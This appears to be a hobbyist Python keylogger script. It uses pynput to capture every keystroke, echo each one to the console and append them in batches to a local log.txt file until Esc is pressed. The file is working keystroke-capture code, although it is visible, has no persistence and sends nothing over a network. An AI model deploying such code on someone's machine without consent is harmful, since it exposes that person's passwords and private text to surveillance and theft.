import pynput
from pynput.keyboard import Key, Listener

f="log.txt"
store=""
count=0

def write(file,input):
    """function that takes key in and converts to char then appends to file"""
    global count
    global store
    store=str(store)+input
    count=count+1
    print(count)
    if count>=50:
        with open(file,'a') as file:
            file.write(store)
            file.close()
            count=0
            store=""

def on_release(key):
    """ends program on release of esc key"""
    if key==Key.esc:
        return False

def on_press(key):
    """reformats key input as string then writes it to console aswell as txt file"""
    global store
    temp="{0}"
    temp=temp.format(key)
    if temp=="Key.enter":
        temp='\n'
    if len(temp)==3:   
        temp=temp[1]
    else:
        temp=' '+temp+' '
    
    print(store)
    print(temp)
    write(f,temp)

with Listener(on_press=on_press,on_release=on_release) as Listener:
    Listener.join()